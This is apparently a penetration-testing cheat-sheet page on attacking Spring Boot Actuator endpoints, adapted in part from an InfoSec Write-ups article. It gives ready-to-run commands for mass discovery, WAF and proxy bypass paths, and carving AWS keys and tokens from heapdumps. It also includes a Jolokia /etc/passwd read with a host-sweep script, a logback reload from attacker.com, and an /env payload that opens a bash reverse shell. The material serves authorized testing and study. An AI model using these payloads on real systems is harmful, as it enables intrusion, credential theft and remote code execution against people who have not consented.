---
tags:
  - Web
---

# :material-leaf: Spring Boot

<span class="pill pill-hard">actuators → RCE</span> <span class="pill pill-info">web</span>

Spring Boot apps expose **Actuator** management endpoints that leak config (and
secrets) and, when writable, reach RCE. Plus the infamous **Spring4Shell** and
**SpEL/Cloud** injection bugs.

!!! abstract "TL;DR"
    Enumerate `/actuator/*` → read `/env` and `/heapdump` for secrets → abuse
    `/env` + `/refresh` or a writable endpoint for RCE. Check for Spring4Shell.

## :material-magnify: Find the actuators

```bash
# common bases: /actuator  or (older) root paths
for e in actuator actuator/health actuator/env actuator/mappings \
         actuator/heapdump actuator/beans actuator/httptrace \
         env health mappings trace heapdump; do
  curl -s -o /dev/null -w "%{http_code}  /$e\n" http://$TARGET/$e
done
curl -s http://$TARGET/actuator | jq .            # lists exposed endpoints
```

!!! loot "/env and /heapdump leak everything"
    ```bash
    curl -s http://$TARGET/actuator/env | jq . | grep -iE 'pass|secret|key|token'
    curl -s http://$TARGET/actuator/heapdump -o heap.bin   # then strings/grep for creds
    ```
    DB passwords, cloud keys, and session secrets routinely sit in `/env`.

### Mass discovery

*From "Actuator Unleashed: A Guide to Finding and Exploiting Spring Boot Actuator Endpoints" by coffinxp (InfoSec Write-ups).*

Spring Boot ships a default favicon, so its hash is a reliable fingerprint. Pivot on
it in Shodan to build a target list scoped to one org, hostname or certificate:

```text
org:target_org http.favicon.hash:116323821
ssl:"example.com" http.favicon.hash:116323821
ssl.cert.subject.CN:"*.example.com" http.favicon.hash:116323821
hostname:"example.com" http.favicon.hash:116323821
ssl.cert.subject.CN:"example.com" http.favicon.hash:116323821
```

Then confirm which of those hosts actually expose management endpoints. Feed the
list to template scanning, a Spring-specific wordlist, and a path-probing sweep —
`401`/`403` still counts as "reachable", so keep those status codes in the filter:

```bash
cat act.txt | nuclei -tags actuator -c 50  
```

```bash
cat act.txt | nuclei -tags jolokia -es info,low -silent
```

```bash
# Search for common Spring Boot paths on a list of targets
dirsearch -l target.txt -w /Seclist/Discovery/Web-Content/spring-boot.txt -x 404 -o output.txt
```

```bash
# Check a list of targets for /actuator, /actuator/health, etc.
cat targets.txt | httpx-toolkit -silent -threads 50 -path '/actuator,/actuator/health,/actuator/info' -mc 200,401,403,302 > actuators.txt
```

### Endpoint hitlist

Everything worth probing once a base path answers — `/env`, `/heapdump`,
`/threaddump`, `/mappings` and `/jolokia` are the ones that pay:

```text
http://ipaddr/actuator
http://ipaddr/actuator/health
http://ipaddr/actuator/info
http://ipaddr/actuator/env
http://ipaddr/actuator/configprops
http://ipaddr/actuator/beans
http://ipaddr/actuator/mappings
http://ipaddr/actuator/metrics
http://ipaddr/actuator/metrics/{metric}
http://ipaddr/actuator/loggers
http://ipaddr/actuator/threaddump
http://ipaddr/actuator/heapdump
http://ipaddr/actuator/jolokia
http://ipaddr/actuator/hawtio
http://ipaddr/actuator/httptrace
http://ipaddr/actuator/auditevents
http://ipaddr/actuator/scheduledtasks
http://ipaddr/actuator/caches
http://ipaddr/actuator/caches/{cacheName}
http://ipaddr/actuator/sessions
http://ipaddr/actuator/sessions/{sessionId}
http://ipaddr/actuator/shutdown
http://ipaddr/actuator/startup
http://ipaddr/actuator/prometheus
http://ipaddr/actuator/trace
http://ipaddr/actuator/conditions
http://ipaddr/actuator/refresh
http://ipaddr/actuator/restart
http://ipaddr/actuator/env/{property}
```

`/mappings` gives you the full route table of the app (free endpoint discovery),
`/threaddump` and `/httptrace` leak in-flight requests with headers and session
tokens, `/sessions` can hand you live session IDs, and `/shutdown` is a DoS if it
answers `POST`.

## :material-lock-open-variant: Bypassing access controls

*From "Actuator Unleashed" by coffinxp (InfoSec Write-ups).*

A `403` on `/actuator/env` usually comes from a reverse proxy or WAF rule, not from
Spring itself — the app behind it is still happy to answer. Two angles: convince the
front end the request is internal, or mangle the path so the proxy's matcher misses
while the backend still routes it.

Claim an internal source address:

```http
GET /actuator/env HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
```

Or override the routed path after the ACL has already matched the allowed one:

```http
GET /some-allowed-path HTTP/1.1
Host: example.com
X-Original-URL: /actuator/env
```

Path-shape tricks — feed these into your wordlist or scanner and diff the responses,
since proxies and Spring normalise paths differently:

```text
# Semicolon / matrix-segment tricks
/actuator;/env
/actuator;jsessionid=1234/env
/actuator;/

# Double-slash & extra segments
//actuator
/actuator//env
/actuator/.

# Dot-segment / traversal-style
/./actuator
/../actuator

# URL / percent-encoding
/%2e%2e/actuator
/actuator%2Fenv
/actuator%00

# Trailing dots & extension variants
/actuator.
/actuator..
/actuator.json
/actuator.html

# Query / path-mix encodings
/actuator?path=env
/actuator/env?some=param
/actuator%3Fenv  # (encoded ? in path)

# Scheme, host and port variations
https://target:8080/actuator
http://target/actuator
```

Also sweep the verb and the proxy header set — an ACL scoped to `GET` frequently
leaves `HEAD`/`OPTIONS` wide open:

```text
Try different verbs:
GET
HEAD
OPTIONS

Proxy-related headers (test only with permission):
X-Original-URL: /actuator/env
X-Rewrite-URL: /actuator/env
X-Forwarded-For: 127.0.0.1
```

## :material-memory: Mining the heapdump

*From "Actuator Unleashed" by coffinxp (InfoSec Write-ups).*

`/actuator/heapdump` hands you a full snapshot of process memory — every credential
the app has touched is in there as a plain string. Grab it, then carve. AWS access
key IDs always start with `AKIA`, and the context lines usually contain the matching
secret key:

```bash
# Download the heapdump first: wget http://target.com/actuator/heapdump
strings heapdump | grep -B 2 -A 2 "AKIA"
```

Broader passes for tokens and secrets:

```bash
# AWS Access Key IDs (AKIA...)
strings -a -n 6 heapdump | grep -Eo 'AKIA[0-9A-Z]{16}' | sort -u > aws_keys.txt

# JWT-like tokens (three dot-separated base64 parts)
strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+' | sort -u > jwt_candidates.txt

# Generic long alnum tokens (20+ chars) — often API keys
strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9_\-]{20,}' | sort -u > long_token_candidates.txt

# basic: extract printable strings (min length 6) and search for keywords
strings -a -n 6 heapdump.hprof | grep -Ei 'password|passwd|pwd|secret|api[_-]?key|token|auth|authorization|bearer|aws|AKIA|ssh-rsa' -n > possible_secrets.txt
```

For structured digging (object graphs, retained maps holding config beans) load the
`.hprof` into VisualVM instead of grepping blind.

## :material-fire: RCE paths

```text
# 1) Writable /env + /refresh — set a malicious property (e.g. spring.cloud... or
#    a logging/JNDI-style sink) then trigger a refresh.
# 2) /actuator/gateway routes (Spring Cloud Gateway) — CVE-2022-22947 SpEL RCE.
# 3) Spring4Shell — CVE-2022-22965: class-loader manipulation on WAR-deployed
#    Spring MVC (JDK9+, Tomcat) → write a JSP webshell.
# 4) H2 console (/h2-console) enabled → JDBC → RCE.
```

### Jolokia → file read and RCE

*From "Actuator Unleashed" by coffinxp (InfoSec Write-ups).*

`/actuator/jolokia` publishes JMX MBeans over HTTP, which means anything the JVM
exposes as a managed bean is now a remote API. The `DiagnosticCommand` MBean reads
files — note the path is written with `!` escaping the slashes:

```text
http://domain.com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
```

Sweep a host list for it and keep the hits:

```bash
#!/bin/bash

while read ip; do
    echo "Testing: $ip"
    response=$(curl -s -m 10 "http://$ip/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd")
    if echo "$response" | grep -q "root:"; then
        echo "VULNERABLE: $ip"
        echo "$response" > "vulnerable_$ip.txt"
    fi
done < ip_list.txt
```

If Logback's `JMXConfigurator` bean is registered, tell it to reload its logging
config from a URL you control and serve a `logback.xml` that executes code:

```text
# PoC for RCE by forcing the app to load a malicious logback.xml
http://domain.com/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml
```

### Writable /env → shell

When `/actuator/env` accepts `POST`, overwrite the Hikari connection-test query with
H2 SQL that defines a shell alias and calls it — the next pool validation fires your
command:

```bash
# Set up a reverse shell payload
curl -X POST "http://ip/actuator/env" \
  -H "Content-Type: application/json" \
  -d '{
    "name":"spring.datasource.hikari.connection-test-query",
    "value":"CREATE ALIAS EXEC AS '\''String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd}); return \"done\"; }'\''; CALL EXEC('\''bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'\'');"
  }'

# Remember to start your listener first:
# nc -lvnp YOUR_PORT
```

Burp-side automation worth loading:
[SpringBootFinder](https://github.com/xiaoliangli1128/SpringBootFinder) for detection
and [S4S-Scanner](https://github.com/onurgule/S4S-Scanner) for Spring4Shell.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Leaked secrets → [Cloud](../cloud/index.md); SpEL/JNDI overlaps [Deserialization](../web/deserialization.md).
- Reference: [HackTricks Spring Actuators](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html).
